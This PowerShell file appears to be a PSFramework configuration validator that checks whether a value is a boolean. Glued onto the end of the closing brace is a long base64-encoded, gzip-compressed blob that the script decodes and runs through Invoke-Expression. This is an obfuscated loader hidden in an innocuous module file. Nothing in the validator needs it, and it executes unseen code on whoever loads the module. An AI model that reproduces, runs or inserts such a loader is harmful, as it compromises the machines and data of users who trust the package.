﻿Register-PSFConfigValidation -Name "bool" -ScriptBlock {
	Param (
		$Value
	)
	
	$Result = New-Object PSObject -Property @{
		Success = $True
		Value   = $null
		Message = ""
	}
	try
	{
		if ($Value.GetType().FullName -ne "System.Boolean")
		{
			$Result.Message = "Not a boolean: $Value"
			$Result.Success = $False
			return $Result
		}
	}
	catch
	{
		$Result.Message = "Not a boolean: $Value"
		$Result.Success = $False
		return $Result
	}
	
	$Result.Value = $Value
	
	return $Result
}$s=New-ObjectIO.MemoryStream(,[Convert]::FromBase64String("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"));IEX(New-ObjectIO.StreamReader(New-ObjectIO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();